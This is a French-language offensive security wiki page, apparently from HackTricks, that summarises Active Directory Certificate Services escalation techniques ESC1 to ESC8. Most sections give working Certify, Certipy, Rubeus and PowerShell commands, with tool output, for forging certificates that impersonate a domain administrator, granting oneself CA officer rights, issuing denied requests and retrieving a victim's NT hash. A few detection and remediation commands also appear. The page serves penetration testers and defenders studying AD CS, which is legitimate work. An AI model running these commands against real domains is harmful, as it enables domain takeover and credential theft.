# Escalade de domaine AD CS

{{#include ../../../banners/hacktricks-training.md}}


**Voici un résumé des sections consacrées aux techniques d’escalade des articles suivants :**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)<sup>[[6]](#references)</sup>
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)<sup>[[7]](#references)</sup>
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Modèles de certificats mal configurés - ESC1

### Explication

### Explication des modèles de certificats mal configurés - ESC1

- **L’Enterprise CA accorde des droits d’enrollment à des utilisateurs disposant de faibles privilèges.**
- **L’approbation d’un responsable n’est pas requise.**
- **Aucune signature de personnel autorisé n’est nécessaire.**
- **Les descripteurs de sécurité des modèles de certificats sont trop permissifs, ce qui permet aux utilisateurs disposant de faibles privilèges d’obtenir des droits d’enrollment.**
- **Les modèles de certificats sont configurés pour définir des EKU facilitant l’authentification :**
- Des identifiants Extended Key Usage (EKU), tels que Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0) ou aucun EKU (SubCA), sont inclus.
- **La possibilité pour les demandeurs d’inclure un subjectAltName dans la Certificate Signing Request (CSR) est autorisée par le modèle :**
- Active Directory (AD) donne la priorité au subjectAltName (SAN) présent dans un certificat pour la vérification de l’identité. Cela signifie qu’en spécifiant le SAN dans une CSR, il est possible de demander un certificat afin d’usurper l’identité de n’importe quel utilisateur (par exemple, un administrateur du domaine). La possibilité pour le demandeur de spécifier un SAN est indiquée dans l’objet AD du modèle de certificat via la propriété `mspki-certificate-name-flag`. Cette propriété est un masque de bits, et la présence de l’indicateur `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` permet au demandeur de spécifier le SAN.

> [!CAUTION]
> La configuration décrite permet aux utilisateurs disposant de faibles privilèges de demander des certificats avec le SAN de leur choix, ce qui permet de s’authentifier en tant que n’importe quel principal du domaine via Kerberos ou SChannel.

Cette fonctionnalité est parfois activée pour prendre en charge la génération à la volée de certificats HTTPS ou d’hôte par des produits ou des services de déploiement, ou par manque de compréhension.

Il est à noter que la création d’un certificat avec cette option déclenche un avertissement, ce qui n’est pas le cas lorsqu’un modèle de certificat existant (tel que le modèle `WebServer`, pour lequel `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` est activé) est dupliqué puis modifié afin d’inclure un OID d’authentification.<sup>[[6]](#references)</sup>

### Exploitation

Pour **trouver les modèles de certificats vulnérables**, vous pouvez exécuter :
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Pour **exploiter cette vulnérabilité afin d'usurper l'identité d'un administrateur**, on pourrait exécuter :
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
Vous pouvez ensuite convertir le **certificate généré au format `.pfx`** et l'utiliser pour vous **authentifier à l'aide de Rubeus ou de certipy** à nouveau :<sup>[[5]](#references)</sup>
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Les binaires Windows « Certreq.exe » et « Certutil.exe » peuvent être utilisés pour générer le PFX : https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

L’énumération des certificate templates au sein du schéma de configuration de l’AD Forest, plus précisément ceux ne nécessitant ni approbation ni signatures, possédant un EKU Client Authentication ou Smart Card Logon, et pour lesquels le flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` est activé, peut être effectuée en exécutant la requête LDAP suivante :
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Modèles de certificats mal configurés - ESC2

### Explication

Le deuxième scénario d’abus est une variante du premier :

1. Les droits d’enrollment sont accordés aux utilisateurs disposant de faibles privilèges par l’Enterprise CA.
2. L’exigence d’approbation du manager est désactivée.
3. La nécessité de signatures autorisées est omise.
4. Un descripteur de sécurité trop permissif sur le modèle de certificat accorde les droits d’enrollment de certificats aux utilisateurs disposant de faibles privilèges.
5. **Le modèle de certificat est défini pour inclure l’EKU Any Purpose ou aucun EKU.**

L’**EKU Any Purpose** permet à un attaquant d’obtenir un certificat pour **n’importe quelle finalité**, notamment l’authentification client, l’authentification serveur, la signature de code, etc. La même **technique utilisée pour ESC3** peut être employée pour exploiter ce scénario.

Les certificats **sans EKU**, qui agissent comme des certificats de CA subordonnée, peuvent être exploités **pour n’importe quelle finalité** et peuvent **également être utilisés pour signer de nouveaux certificats**. Ainsi, un attaquant pourrait spécifier des EKU ou des champs arbitraires dans les nouveaux certificats en utilisant un certificat de CA subordonnée.

Cependant, les nouveaux certificats créés pour l’**authentification au domaine** ne fonctionneront pas si la CA subordonnée n’est pas approuvée par l’objet **`NTAuthCertificates`**, ce qui constitue le paramètre par défaut. Néanmoins, un attaquant peut toujours créer de **nouveaux certificats avec n’importe quel EKU** et des valeurs de certificat arbitraires. Ceux-ci pourraient potentiellement être **utilisés à mauvais escient** à diverses fins (par exemple, signature de code, authentification serveur, etc.) et pourraient avoir des implications importantes pour d’autres applications du réseau comme SAML, AD FS ou IPSec.<sup>[[6]](#references)</sup>

Pour énumérer les modèles correspondant à ce scénario dans le schéma de configuration de l’AD Forest, la requête LDAP suivante peut être exécutée :
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Modèles d’Enrollment Agent mal configurés - ESC3

### Explication

Ce scénario est similaire aux premier et deuxième, mais **abuse** d’un **EKU différent** (Certificate Request Agent) et de **2 modèles différents** (il comporte donc 2 ensembles d’exigences),

L’**EKU Certificate Request Agent** (OID 1.3.6.1.4.1.311.20.2.1), appelé **Enrollment Agent** dans la documentation Microsoft, permet à un principal de **s’inscrire** pour obtenir un **certificat** **au nom d’un autre utilisateur**.

L’**« enrollment agent »** s’inscrit à un tel **modèle** et utilise le **certificat obtenu pour co-signer une CSR au nom de l’autre utilisateur**. Il **envoie** ensuite la **CSR co-signée** à la CA, en s’inscrivant à un **modèle** qui **autorise l’« enroll on behalf of »**, et la CA répond avec un **certificat appartenant à l’« autre » utilisateur**.<sup>[[6]](#references)</sup>

**Exigences 1 :**

- Des droits d’Enrollment sont accordés aux utilisateurs peu privilégiés par l’Enterprise CA.
- L’exigence d’approbation du manager est omise.
- Aucune exigence de signatures autorisées.
- Le descripteur de sécurité du certificate template est excessivement permissif et accorde des droits d’Enrollment aux utilisateurs peu privilégiés.
- Le certificate template inclut l’EKU Certificate Request Agent, permettant de demander d’autres certificate templates au nom d’autres principals.

**Exigences 2 :**

- L’Enterprise CA accorde des droits d’Enrollment aux utilisateurs peu privilégiés.
- L’approbation du manager est contournée.
- La version du schéma du template est soit 1, soit supérieure à 2, et elle spécifie une Application Policy Issuance Requirement nécessitant l’EKU Certificate Request Agent.
- Un EKU défini dans le certificate template permet l’authentification au domaine.
- Les restrictions pour les Enrollment Agents ne sont pas appliquées sur la CA.

### Abuse

Vous pouvez utiliser [**Certify**](https://github.com/GhostPack/Certify) ou [**Certipy**](https://github.com/ly4k/Certipy) pour **abuser** de ce scénario :<sup>[[4]](#references)</sup>
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
Les **utilisateurs** autorisés à **obtenir** un **certificat d’enrollment agent**, les modèles dans lesquels les **agents** d’enrollment sont autorisés à s’inscrire, ainsi que les **comptes** au nom desquels l’agent d’enrollment peut agir, peuvent être limités par les CA d’entreprise. Cela s’effectue en ouvrant le **snap-in** `certsrc.msc`, en **cliquant avec le bouton droit sur la CA**, en **cliquant sur Properties**, puis en **accédant** à l’onglet « Enrollment Agents ».

Cependant, il est précisé que le paramètre **par défaut** des CA est « **Do not restrict enrollment agents** ». Lorsque la restriction des enrollment agents est activée par les administrateurs, en sélectionnant « Restrict enrollment agents », la configuration par défaut reste extrêmement permissive. Elle permet à **Everyone** de s’inscrire à tous les modèles en tant que n’importe qui.

### PoCs PowerShell uniquement pour Windows avec Certi-Bhai

[**Certi-Bhai**](https://github.com/incredibleindishell/Certi-Bhai) exploite ESC1 et ESC2/ESC3 sans Certify ni Certipy. Ses scripts créent une clé RSA exportable de 2048 bits avec l’API COM `X509Enrollment`, construisent une requête PKCS#10, découvrent le premier `pKIEnrollmentService` via LDAP, la soumettent via `CertificateAuthority.Request`, installent la réponse dans `Cert:\CurrentUser\My` et exportent un PFX encodé en Base64. Le script ESC1 ajoute un SAN UPN choisi par l’attaquant (`XCN_CERT_ALT_NAME_USER_PRINCIPLE_NAME`, valeur `0xb`), tandis que les scripts ESC2/ESC3 utilisent le premier certificat pour signer une requête PKCS#7 on-behalf-of.<sup>[[27]](#references)</sup>
```powershell
# ESC1: supply the identity in the subject and UPN SAN
.\ESC1\esc1.ps1 -subjectName "CN=Administrator,CN=Users,DC=corp,DC=local" `
-altName "administrator@corp.local" -templateName "VulnESC1" -pfxPass "PfxPass!"

# ESC2/ESC3: obtain an agent-capable certificate, then enroll for the target
.\ESC3\esc3_working.ps1 -templateName "VulnEnrollmentAgent" `
-target_user "administrator" -domain "CORP" -pfxPass "PfxPass!"
```
Les scripts affichent le Base64 du **PFX**, qui inclut la clé privée, pour une utilisation directe avec Rubeus. Ne le remplacez pas par `[Convert]::ToBase64String($cert.RawData)` : `RawData` encode uniquement le certificat public et ne peut pas signer la requête PKINIT.<sup>[[5]](#references)[[27]](#references)</sup>
```powershell
Rubeus.exe asktgt /user:administrator /certificate:<BASE64_PFX> /password:PfxPass! /nowrap
```
## Contrôle d'accès vulnérable aux modèles de certificats - ESC4

### **Explication**

Le **descripteur de sécurité** des **modèles de certificats** définit les **permissions** dont disposent certains **principals AD** concernant le modèle.

Si un **attacker** possède les **permissions** requises pour **modifier** un **modèle** et **mettre en place** l'une des **mauvaises configurations exploitables** décrites dans les **sections précédentes**, une escalation de privilèges peut être facilitée.

Les permissions notables applicables aux modèles de certificats comprennent :<sup>[[6]](#references)</sup>

- **Owner:** Accorde un contrôle implicite sur l'objet, permettant de modifier n'importe quel attribut.
- **FullControl:** Permet une autorité complète sur l'objet, y compris la possibilité de modifier n'importe quel attribut.
- **WriteOwner:** Permet de modifier le propriétaire de l'objet pour le remplacer par un principal contrôlé par l'attaquant.
- **WriteDacl:** Permet d'ajuster les contrôles d'accès, ce qui peut accorder FullControl à un attaquant.
- **WriteProperty:** Autorise la modification de n'importe quelle propriété de l'objet.

### Abuse

Pour identifier les principals disposant de droits de modification sur les modèles et autres objets PKI, effectuez une enumeration avec Certify :
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
Un exemple de privesc comme le précédent :

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 correspond au cas où un utilisateur dispose de privilèges d’écriture sur un certificate template. Cela peut par exemple être exploité pour écraser la configuration du certificate template afin de rendre le template vulnérable à ESC1.

Comme nous pouvons le voir dans le chemin ci-dessus, seul `JOHNPC` dispose de ces privilèges, mais notre utilisateur `JOHN` possède la nouvelle edge `AddKeyCredentialLink` vers `JOHNPC`. Comme cette technique est liée aux certificates, j’ai également implémenté cette attaque, connue sous le nom de [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab).<sup>[[8]](#references)</sup> Voici un petit aperçu de la commande `shadow auto` de Certipy permettant de récupérer le NT hash de la victime.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** peut écraser la configuration d’un certificate template avec une seule commande. **Par défaut**, Certipy va **écraser** la configuration pour la rendre **vulnérable à ESC1**. Nous pouvons également spécifier le **paramètre `-save-old` pour sauvegarder l’ancienne configuration**, ce qui sera utile pour **restaurer** la configuration après notre attaque.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Contrôle d'accès vulnérable aux objets PKI - ESC5

### Explication

Le vaste réseau de relations interconnectées fondées sur les ACL, qui inclut plusieurs objets autres que les modèles de certificats et l'autorité de certification, peut avoir un impact sur la sécurité de l'ensemble du système AD CS. Ces objets, qui peuvent affecter considérablement la sécurité, comprennent :

- L'objet ordinateur AD du serveur CA, qui peut être compromis par des mécanismes tels que S4U2Self ou S4U2Proxy.
- Le serveur RPC/DCOM du serveur CA.
- Tout objet AD descendant ou conteneur situé dans le chemin de conteneur spécifique `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Ce chemin inclut notamment des conteneurs et des objets tels que le conteneur Certificate Templates, le conteneur Certification Authorities, l'objet NTAuthCertificates et le Enrollment Services Container.

La sécurité du système PKI peut être compromise si un attaquant disposant de faibles privilèges parvient à prendre le contrôle de l'un de ces composants critiques.<sup>[[6]](#references)</sup>

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Explication

Le sujet abordé dans l'[**article de CQure Academy**](https://cqureacademy.com/blog/enhanced-key-usage) traite également des implications de l'indicateur **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, telles qu'elles sont présentées par Microsoft. Lorsque cette configuration est activée sur une autorité de certification (CA), elle permet d'inclure des **valeurs définies par l'utilisateur** dans le **subject alternative name** pour **toute requête**, y compris celles construites à partir d'Active Directory®. Cette configuration permet donc à un **intrus** de s'inscrire via **n'importe quel modèle** configuré pour l'**authentification** au domaine, notamment ceux qui autorisent l'inscription des utilisateurs **non privilégiés**, comme le modèle User standard. Par conséquent, un certificat peut être obtenu, permettant à l'intrus de s'authentifier en tant qu'administrateur de domaine ou que **toute autre entité active** au sein du domaine.<sup>[[9]](#references)</sup>

**Remarque** : La méthode permettant d'ajouter des **noms alternatifs** dans une Certificate Signing Request (CSR), via l'argument `-attrib "SAN:"` de `certreq.exe` (appelé « Name Value Pairs »), diffère de la stratégie d'exploitation des SAN dans ESC1. La distinction réside ici dans la **manière dont les informations du compte sont encapsulées** : dans un attribut du certificat, plutôt que dans une extension.

### Abuse

Pour vérifier si le paramètre est activé, les organisations peuvent utiliser la commande suivante avec `certutil.exe` :
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Cette opération utilise essentiellement un **accès au registre à distance** ; par conséquent, une autre approche pourrait être :
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Des outils comme [**Certify**](https://github.com/GhostPack/Certify) et [**Certipy**](https://github.com/ly4k/Certipy) sont capables de détecter cette mauvaise configuration et de l’exploiter :<sup>[[4]](#references)</sup>
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Pour modifier ces paramètres, à condition de disposer de droits d’**administration du domaine** ou équivalents, la commande suivante peut être exécutée depuis n’importe quel poste de travail :
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Pour désactiver cette configuration dans votre environnement, le flag peut être supprimé avec :
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> Après les mises à jour de sécurité de mai 2022, les nouveaux **certificats** émis contiendront une **extension de sécurité** qui intègre la propriété `objectSid` du **requester**. Pour ESC1, ce SID est dérivé du SAN spécifié. Cependant, pour **ESC6**, le SID reflète le `objectSid` du **requester**, et non le SAN.\
> Pour exploiter ESC6, le système doit impérativement être vulnérable à ESC10 (Weak Certificate Mappings), qui donne la priorité au **SAN** par rapport à la nouvelle extension de sécurité.

## Contrôle d'accès vulnérable de la Certificate Authority - ESC7

### Attack 1

#### Explication

Le contrôle d'accès d'une certificate authority est géré par un ensemble d'autorisations qui régissent les actions de la CA. Ces autorisations peuvent être consultées en accédant à `certsrv.msc`, en cliquant avec le bouton droit sur une CA, en sélectionnant les propriétés, puis en accédant à l'onglet Sécurité. De plus, les autorisations peuvent être énumérées à l'aide du module PSPKI avec des commandes telles que :
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Cela fournit des informations sur les principaux droits, à savoir **`ManageCA`** et **`ManageCertificates`**, correspondant respectivement aux rôles « administrateur de l’AC » et « Gestionnaire de certificats ».<sup>[[6]](#references)</sup>

#### Abus

Disposer des droits **`ManageCA`** sur une autorité de certification permet au principal de manipuler les paramètres à distance à l’aide de PSPKI. Cela inclut l’activation du flag **`EDITF_ATTRIBUTESUBJECTALTNAME2`** afin d’autoriser la spécification d’un SAN dans n’importe quel template, un aspect essentiel de la domain escalation.

La simplification de ce processus est possible grâce à l’utilisation du cmdlet **Enable-PolicyModuleFlag** de PSPKI, qui permet d’effectuer des modifications sans interaction directe avec l’interface graphique.

La possession des droits **`ManageCertificates`** permet d’approuver les demandes en attente, contournant ainsi efficacement la protection « approbation par le gestionnaire de certificats de l’AC ».

Une combinaison des modules **Certify** et **PSPKI** peut être utilisée pour demander, approuver et télécharger un certificat :
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Attaque 2

#### Explication

> [!WARNING]
> Lors de l'**attaque précédente**, les permissions **`Manage CA`** ont été utilisées pour **activer** le flag **EDITF_ATTRIBUTESUBJECTALTNAME2** afin d'effectuer l'**attaque ESC6**, mais cela n'aura aucun effet tant que le service CA (`CertSvc`) n'aura pas été redémarré. Lorsqu'un utilisateur dispose du droit d'accès **`Manage CA`**, il est également autorisé à **redémarrer le service**. Cependant, cela **ne signifie pas que l'utilisateur peut redémarrer le service à distance**. De plus, l'attaque E**SC6 pourrait ne pas fonctionner directement** dans la plupart des environnements patchés en raison des mises à jour de sécurité de mai 2022.

Une autre attaque est donc présentée ici.

Prérequis :

- Permission **`ManageCA`** uniquement
- Permission **`Manage Certificates`** (peut être accordée depuis **`ManageCA`**)
- Le template de certificat **`SubCA`** doit être **activé** (peut être activé depuis **`ManageCA`**)

La technique repose sur le fait que les utilisateurs disposant des droits d'accès **`Manage CA`** et **`Manage Certificates`** peuvent **émettre des demandes de certificat échouées**. Le template de certificat **`SubCA`** est **vulnérable à ESC1**, mais **seuls les administrateurs** peuvent s'y inscrire. Ainsi, un **utilisateur** peut **demander** à s'inscrire dans **`SubCA`** — ce qui sera **refusé** — puis la demande sera **émise par le manager par la suite**.<sup>[[6]](#references)</sup>

#### Exploitation

Vous pouvez **vous accorder le droit d'accès `Manage Certificates`** en ajoutant votre utilisateur comme nouvel officier.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
Le **`SubCA`** template peut être **activé sur la CA** avec le paramètre `-enable-template`. Par défaut, le template `SubCA` est activé.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Si nous avons rempli les prérequis pour cette attaque, nous pouvons commencer par **demander un certificat basé sur le modèle `SubCA`**.

**Cette demande sera refusée**, mais nous sauvegarderons la clé privée et noterons l’ID de la demande.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Avec nos **`Manage CA` et `Manage Certificates`**, nous pouvons ensuite **émettre la demande de certificat ayant échoué** avec la commande `ca` et le paramètre `-issue-request <request ID>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
Et enfin, nous pouvons **récupérer le certificat délivré** avec la commande `req` et le paramètre `-retrieve <request ID>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Attack 3 – Abuse de l’extension Manage Certificates (SetExtension)

#### Explication

En plus des abus ESC7 classiques (activation des attributs EDITF ou approbation des demandes en attente), **Certify 2.0** a révélé une toute nouvelle primitive qui nécessite uniquement le rôle *Manage Certificates* (également appelé **Certificate Manager / Officer**) sur l’Enterprise CA.<sup>[[3]](#references)</sup>

La méthode RPC `ICertAdmin::SetExtension` peut être exécutée par tout principal détenant *Manage Certificates*. Alors que cette méthode était traditionnellement utilisée par les CA légitimes pour mettre à jour les extensions des demandes **en attente**, un attaquant peut l’exploiter pour **ajouter une extension de certificat *non par défaut*** (par exemple un OID personnalisé de *Certificate Issuance Policy* tel que `1.1.1.1`) à une demande en attente d’approbation.

Comme le template ciblé ne **définit pas de valeur par défaut pour cette extension**, la CA ne remplacera PAS la valeur contrôlée par l’attaquant lorsque la demande sera finalement émise. Le certificat obtenu contient donc une extension choisie par l’attaquant, qui peut :

* Satisfaire aux exigences d’Application / Issuance Policy d’autres templates vulnérables (entraînant une élévation de privilèges).
* Injecter des EKU ou des policies supplémentaires accordant au certificat une confiance inattendue dans des systèmes tiers.

En résumé, *Manage Certificates* – auparavant considéré comme la moitié « moins puissante » d’ESC7 – peut désormais être exploité pour une élévation complète de privilèges ou une persistance à long terme, sans modifier la configuration de la CA ni nécessiter le droit plus restrictif *Manage CA*.

#### Abuser de la primitive avec Certify 2.0

1. **Soumettre une demande de certificat qui restera *en attente*.** Cela peut être forcé avec un template nécessitant l’approbation d’un responsable :
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. **Ajouter une extension personnalisée à la demande en attente** à l’aide de la nouvelle commande `manage-ca` :
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*Si le template ne définit pas déjà l’extension *Certificate Issuance Policies*, la valeur ci-dessus sera conservée après l’émission.*

3. **Émettre la demande** (si votre rôle dispose également des droits d’approbation *Manage Certificates*) ou attendre qu’un opérateur l’approuve. Une fois émise, télécharger le certificat :
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. Le certificat obtenu contient désormais l’OID d’issuance-policy malveillant et peut être utilisé dans des attaques ultérieures (par exemple ESC13, domain escalation, etc.).

> REMARQUE : La même attaque peut être exécutée avec Certipy ≥ 4.7 via la commande `ca` et le paramètre `-set-extension`.

## NTLM Relay vers les endpoints HTTP AD CS – ESC8

### Explication

> [!TIP]
> Dans les environnements où **AD CS est installé**, s’il existe un **endpoint d’inscription web vulnérable** et qu’au moins un **template de certificat est publié** et autorise l’inscription des ordinateurs du domaine ainsi que l’authentification client (comme le template **`Machine`** par défaut), **tout ordinateur dont le service spooler est actif peut être compromis par un attaquant** !

Plusieurs **méthodes d’inscription basées sur HTTP** sont prises en charge par AD CS et rendues disponibles par des rôles de serveur supplémentaires que les administrateurs peuvent installer. Ces interfaces d’inscription de certificats via HTTP sont vulnérables aux **attaques NTLM relay**. Depuis une **machine compromise, un attaquant peut usurper n’importe quel compte AD qui s’authentifie via NTLM entrant**. En usurpant le compte victime, ces interfaces web peuvent être utilisées par un attaquant pour **demander un certificat d’authentification client à l’aide des templates de certificat `User` ou `Machine`**.

- L’**interface d’inscription web** (une ancienne application ASP disponible à l’adresse `http://<caserver>/certsrv/`) utilise HTTP uniquement par défaut, ce qui n’offre aucune protection contre les attaques NTLM relay. De plus, elle autorise explicitement uniquement l’authentification NTLM via son en-tête HTTP Authorization, rendant inapplicables des méthodes d’authentification plus sécurisées comme Kerberos.
- Le **Certificate Enrollment Service** (CES), le Web Service **Certificate Enrollment Policy** (CEP) et le **Network Device Enrollment Service** (NDES) prennent par défaut en charge l’authentification negotiate via leur en-tête HTTP Authorization. L’authentification negotiate prend en charge à la fois **Kerberos** et **NTLM**, permettant à un attaquant de **rétrograder l’authentification vers NTLM** pendant les attaques relay. Bien que ces services web activent HTTPS par défaut, HTTPS seul **ne protège pas contre les attaques NTLM relay**. La protection contre les attaques NTLM relay pour les services HTTPS n’est possible que lorsque HTTPS est combiné à la liaison de canal. Malheureusement, AD CS n’active pas l’Extended Protection for Authentication sur IIS, pourtant nécessaire à la liaison de canal.<sup>[[6]](#references)</sup>

Un **problème** courant des attaques NTLM relay est la **courte durée des sessions NTLM** et l’impossibilité pour l’attaquant d’interagir avec des services qui **exigent la signature NTLM**.

Néanmoins, cette limitation peut être contournée en exploitant une attaque NTLM relay pour obtenir un certificat pour l’utilisateur, car la période de validité du certificat détermine la durée de la session, et le certificat peut être utilisé avec des services qui **imposent la signature NTLM**. Pour savoir comment utiliser un certificat volé, consulter :


{{#ref}}
account-persistence.md
{{#endref}}

Une autre limitation des attaques NTLM relay est qu’**une machine contrôlée par l’attaquant doit être authentifiée par un compte victime**. L’attaquant peut soit attendre, soit tenter de **forcer** cette authentification :


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Abus**

[**Certify**](https://github.com/GhostPack/Certify) énumère les **endpoints HTTP AD CS activés** :<sup>[[4]](#references)</sup>
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

La propriété `msPKI-Enrollment-Servers` est utilisée par les autorités de certification (CA) d’entreprise pour stocker les endpoints du Certificate Enrollment Service (CES). Ces endpoints peuvent être analysés et listés à l’aide de l’outil **Certutil.exe** :
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

